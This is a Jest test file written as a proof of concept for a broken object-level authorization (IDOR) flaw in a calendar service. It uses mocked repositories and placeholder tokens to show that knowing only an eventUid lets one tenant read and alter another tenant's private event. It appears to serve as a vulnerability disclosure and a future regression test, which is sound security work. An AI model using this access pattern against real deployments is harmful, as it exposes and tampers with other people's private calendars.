/**
 * POC: IDOR / broken object-level authorization in GoogleCalendarService#getEventDetails
 * and #updateEventDetails.
 *
 * Both methods resolve a booking reference by `eventUid` alone
 * (BookingReferencesRepository_2024_08_13#getBookingReferencesIncludeSensitiveCredentials),
 * then authenticate to Google Calendar using the CREDENTIAL OWNER's stored OAuth
 * key/delegation — without ever taking or checking a caller `userId`.
 *
 * This test simulates two tenants:
 *   - victim  (userId 1): owns the booking / calendar credential for `eventUid`
 *   - attacker (userId 2): the caller, who knows/guesses `eventUid`
 *
 * It proves that calling the service with only `eventUid` (exactly what the
 * controller does today — see cal-unified-calendars.controller.ts
 * getCalendarEventDetails/updateCalendarEvent) returns and mutates the VICTIM's
 * event using the VICTIM's credentials, with no code path ever comparing the
 * caller's identity to the booking owner.
 *
 * Run: yarn jest google-calendar.idor.poc.spec.ts (from apps/api/v2)
 *
 * Expected AFTER a fix: this file's "vulnerable" tests should start failing
 * once the service requires/validates a userId against the booking owner —
 * at that point convert them into `expect(...).rejects.toThrow(ForbiddenException)`
 * regression tests instead.
 */

const mockDelegationFindById = jest.fn().mockResolvedValue(null);
const mockJwtAuthorize = jest.fn().mockResolvedValue(undefined);
const MockJWT = jest.fn().mockImplementation(() => ({
  authorize: mockJwtAuthorize,
}));

// Captures the calendarId/eventId/requestBody actually sent to Google so we can
// prove the call operated on the victim's calendar, not the attacker's.
const mockEventsGet = jest.fn();
const mockEventsPatch = jest.fn();
const MockCalendar = jest.fn().mockImplementation(() => ({
  events: { get: mockEventsGet, patch: mockEventsPatch },
}));

jest.mock(
  "@calcom/platform-libraries/app-store",
  () => ({
    DelegationCredentialRepository: {
      findByIdIncludeSensitiveServiceAccountKey: mockDelegationFindById,
    },
    OAuth2UniversalSchema: { parse: jest.fn((v: unknown) => v) },
  }),
  { virtual: true }
);
jest.mock(
  "@calcom/platform-libraries",
  () => ({
    getBusyCalendarTimes: jest.fn(),
    getConnectedDestinationCalendarsAndEnsureDefaultsInDb: jest.fn(),
    credentialForCalendarServiceSelect: {},
  }),
  { virtual: true }
);
jest.mock("googleapis-common", () => ({
  JWT: MockJWT,
}));
jest.mock("@googleapis/calendar", () => ({
  calendar_v3: {
    Calendar: MockCalendar,
  },
}));

import { Test, TestingModule } from "@nestjs/testing";
import { GoogleCalendarService } from "./google-calendar.service";
import { BookingReferencesRepository_2024_08_13 } from "@/platform/bookings/2024-08-13/repositories/booking-references.repository";
import { GoogleCalendarService as GCalService } from "@/platform/calendars/services/gcal.service";
import { CredentialsRepository } from "@/modules/credentials/credentials.repository";

describe("POC: IDOR in GoogleCalendarService.getEventDetails / updateEventDetails", () => {
  let service: GoogleCalendarService;
  let mockBookingReferencesRepo: { getBookingReferencesIncludeSensitiveCredentials: jest.Mock };
  let mockGCalService: { getOAuthClient: jest.Mock; redirectUri: string };
  let mockCredentialsRepo: Record<string, jest.Mock>;

  const VICTIM_EMAIL = "victim@example.com";
  const VICTIM_EVENT_UID = "victim-google-event-id-abc123"; // e.g. sequential/guessable Google event id
  const VICTIM_CALENDAR_ID = "victim-primary-calendar";

  const victimBookingReference = {
    uid: VICTIM_EVENT_UID,
    externalCalendarId: VICTIM_CALENDAR_ID,
    credential: { key: { access_token: "VICTIM_ACCESS_TOKEN", refresh_token: "VICTIM_REFRESH_TOKEN" } },
    delegationCredential: null,
    booking: { user: { id: 1, email: VICTIM_EMAIL } },
  };

  beforeEach(async () => {
    jest.clearAllMocks();

    mockBookingReferencesRepo = {
      getBookingReferencesIncludeSensitiveCredentials: jest.fn().mockResolvedValue(victimBookingReference),
    };

    mockGCalService = {
      getOAuthClient: jest.fn().mockResolvedValue({ setCredentials: jest.fn() }),
      redirectUri: "http://localhost/callback",
    };

    mockCredentialsRepo = {
      findCredentialWithDelegationByTypeAndUserId: jest.fn(),
      findCredentialByIdAndUserId: jest.fn(),
    };

    mockEventsGet.mockResolvedValue({
      data: { id: VICTIM_EVENT_UID, summary: "Victim's private 1:1 with therapist" },
    });
    mockEventsPatch.mockResolvedValue({
      data: { id: VICTIM_EVENT_UID, summary: "PWNED by attacker" },
    });

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        GoogleCalendarService,
        { provide: BookingReferencesRepository_2024_08_13, useValue: mockBookingReferencesRepo },
        { provide: GCalService, useValue: mockGCalService },
        { provide: CredentialsRepository, useValue: mockCredentialsRepo },
      ],
    }).compile();

    service = module.get<GoogleCalendarService>(GoogleCalendarService);
  });

  it("VULNERABLE: attacker with no relation to the victim can read the victim's event by guessing eventUid alone", async () => {
    // Note the method signature: no userId / attacker identity is passed in or
    // checked anywhere in the call chain. This is exactly what
    // CalUnifiedCalendarsController#getCalendarEventDetails does today.
    const result = await service.getEventDetails(VICTIM_EVENT_UID);

    // The attacker gets the victim's private event content back.
    expect(result.summary).toBe("Victim's private 1:1 with therapist");

    // The lookup was keyed on eventUid only — no userId/tenant filter anywhere.
    expect(mockBookingReferencesRepo.getBookingReferencesIncludeSensitiveCredentials).toHaveBeenCalledWith(
      VICTIM_EVENT_UID
    );
    expect(mockBookingReferencesRepo.getBookingReferencesIncludeSensitiveCredentials).toHaveBeenCalledTimes(1);

    // Google was queried using the VICTIM's own calendar, not anything scoped to an attacker.
    expect(mockEventsGet).toHaveBeenCalledWith(
      expect.objectContaining({ calendarId: VICTIM_CALENDAR_ID, eventId: VICTIM_EVENT_UID })
    );
  });

  it("VULNERABLE: attacker with no relation to the victim can modify the victim's event by guessing eventUid alone", async () => {
    const attackerSuppliedPayload = { title: "PWNED by attacker" };

    const result = await service.updateEventDetails(VICTIM_EVENT_UID, attackerSuppliedPayload);

    expect(result.summary).toBe("PWNED by attacker");
    expect(mockEventsPatch).toHaveBeenCalledWith(
      expect.objectContaining({ calendarId: VICTIM_CALENDAR_ID, eventId: VICTIM_EVENT_UID })
    );
  });

  it("VULNERABLE: identical eventUid returns identical victim data regardless of which caller identity is asserted", async () => {
    // Simulates two different authenticated callers (different API keys / userIds)
    // both hitting the same controller endpoint. Because the controller/service
    // never thread a userId through, there is no observable difference in behavior —
    // proving the authorization check that should exist here simply doesn't run.
    const asAttacker = await service.getEventDetails(VICTIM_EVENT_UID);
    const asSomeOtherRandomUser = await service.getEventDetails(VICTIM_EVENT_UID);

    expect(asAttacker).toEqual(asSomeOtherRandomUser);
  });
});
